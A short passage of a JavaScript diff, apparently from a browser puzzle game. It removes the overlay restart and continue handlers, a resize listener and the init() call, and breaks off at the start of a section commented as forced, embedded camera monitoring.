-  $overlayRestart.addEventListener('click', init);
-  $overlayContinue.addEventListener('click', () => {
-    keepPlaying = true;
-    hideOverlay();
-  });
-
-  window.addEventListener('resize', () => render());
-
-  init();
 
   // ============== 摄像头监控（强制模式 + 内嵌） ==============
   const camDom = {
